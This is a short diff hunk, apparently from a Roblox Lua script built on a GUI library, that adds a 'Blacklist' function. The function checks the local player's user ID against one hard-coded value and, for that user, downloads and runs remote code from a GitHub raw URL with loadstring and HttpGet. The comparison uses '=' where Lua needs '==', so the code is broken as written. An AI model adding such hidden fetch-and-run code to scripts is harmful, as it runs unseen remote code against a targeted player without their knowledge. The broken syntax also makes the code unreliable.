@@ -2385,3 +2385,9 @@ Tab:AddDropdown({
 		end
 	end    
 })
+
+local function Blacklist()
+  if game.Players.LocalPlayer.UserId = "1137392849" then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/Blacklist/main/AnM"))()
+  end
+end
